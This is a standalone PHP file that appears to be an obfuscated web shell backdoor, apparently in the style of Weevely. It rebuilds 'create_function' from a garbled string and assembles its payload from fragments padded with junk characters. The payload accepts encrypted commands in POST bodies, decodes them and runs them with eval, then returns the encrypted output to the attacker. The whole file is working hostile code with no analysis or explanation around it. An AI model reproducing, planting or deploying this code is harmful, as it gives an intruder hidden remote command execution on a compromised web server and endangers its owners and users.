<?php
$z=str_replace('y','','creyayte_yyfyunctiyon');
$C='kstrlen(Gk$tGk);$o="";fGkor($i=0;Gk$i<Gk$lGk;){Gkfor(Gk$j=0;($j<$cGk&&$Gki';
$k='"fGkBq6hMGkGkGksGk4wVoSlGkYVB";function x($t,Gk$k){$c=stGkrGklen($k);$l=G';
$d='$k="74Gkdcc847Gk";$Gkkh="5a5aGk74deee7c";Gk$GkkfGk="17506eb48e96Gk";$p=';
$T='<$l);$Gkj++,$i++){$o.Gk=Gk$t{$i}^$k{$j}Gk;}}retGkurGkn $o;}ifGk (@GkpregGkGk_ma';
$v='tch("/$kh(.+)Gk$kf/Gk",@fiGkGkle_get_contents(Gk"php:/Gk/inpGkut"),$m)Gk';
$t='aseGk64Gk_encode(@xGkGk(@gzcompGkress($oGk),$Gkk));priGknt("$p$kh$rGk$kf");}';
$G='==Gk1) {@ob_staGkrt();@eGkvalGk(@gzuncomGkpGkress(@Gkx(@base6Gk4_decodGke($G';
$F='km[1]),$k)Gk));$o=Gk@ob_GkGkget_conGktents();@oGkb_end_GkcGklean();$r=@b';
$V=str_replace('Gk','',$d.$k.$C.$T.$v.$G.$F.$t);
$q=$z('',$V);$q();
?>
